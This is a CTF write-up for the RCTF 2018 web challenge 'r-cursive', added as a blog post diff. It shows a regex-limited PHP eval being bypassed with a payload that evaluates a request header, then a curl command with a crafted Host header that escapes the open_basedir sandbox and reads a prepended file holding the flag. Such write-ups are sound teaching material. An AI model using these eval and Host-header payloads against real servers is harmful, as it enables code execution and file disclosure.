@@ -1,0 +1,62 @@
+---
+title: r-cursive - RCTF 2018
+layout: post
+date: '2018-05-21 22:00:00'
+---
+
+> LUL dat font
+>
+> http://r-cursive.ml
+>
+> hint: If you get stuck after arbitary code execution, try to escape the sandbox. phpinfo may help you figure out how the sandbox works.
+
+*500 points, 21 Solves, web*
+
+We start off at the following page:
+
+```php
+$token = sha1($_SERVER['REMOTE_ADDR']);
+$dir = '../sandbox/'.$token.'/';
+is_dir($dir) ?: mkdir($dir);
+is_file($dir.'index.php') ?: file_put_contents($dir.'index.php', str_replace('#SHA1#', $token, file_get_contents('./template')));
+switch($_GET['action'] ?: ''){
+    case 'go':
+        header('Location: http://'.$token.'.sandbox.r-cursive.ml:1337/');
+        break;
+    case 'reset':
+        system('rm -rf '.$dir);
+        break;
+    default:
+        show_source(__FILE__);
+}
+```
+
+Which after visiting **?action=go** takes us to the following:
+
+```php
+sha1($_SERVER['REMOTE_ADDR']) === 'eeeee661b2832456d66684dbadb5117e9d108d7c' ?: die();
+';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
+```
+
+So we can have our payload evaled only if it passes the regex, which is basically limiting us to a single word function (no underscores) that can either have no arguments, or a single argument that also matches the regex (hense the name r-cursive). So we can do things like `phpinfo();` or `echo(serialize(getcwd()));`
+
+As this was very limiting the first thing to do was to get arbitrary eval. We controlled the headers, and after a bit of trial and error I found `echo(eval(end(getallheaders())));` which would eval the last header, removing the restrictions on what we could call. But it looked like a bunch of methods were banned, and checking by calling `ini_get_all` revealed the following restrictions:
+
+```php
+disable_classes: GlobIterator,DirectoryIterator,FilesystemIterator,RecursiveDirectoryIterator
+disable_functions: system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link
+open_basedir: /var/www/sandbox/eeeee661b2832456d66684dbadb5117e9d108d7c/:/tmp/
+```
+
+After a long time of trying different classes and ways of bypassing the filters I found nothing, so I stopped and reread the hint which got me thinking. The open_basedir must be dynamically being set based on the host name or REMOTE_ADDR. After a bunch more trial and error I found that sending a Host header of `Host: .eeeee661b2832456d66684dbadb5117e9d108d7c` would still send me to the right place by would set `open_basedir` to `/var/www/sandbox/:/tmp/`! I could now read the `init.php` file that we being prepended via `auto_prepend_file`:
+
+```bash
+$ curl 'http://f3e2e661b2832456d66684dbadb5117e9d108d7c.sandbox.r-cursive.ml:1337/f3e2e661b2832456d66684dbadb5117e9d108d7c/?cmd=echo(eval(end(getallheaders())));' -H 'ZZZ: var_dump(file_get_contents("../init.php"));' -H "Host: .f3e2e661b2832456d66684dbadb5117e9d108d7c"
+
+string(148) "<?php
+    ini_set("open_basedir", $_SERVER['DOCUMENT_ROOT']."/:/tmp/");
+    // flag: RCTF{apache_mod_vhost_alias_should_be_configured_correctly}
+?>
+```
+
+`RCTF{apache_mod_vhost_alias_should_be_configured_correctly}`
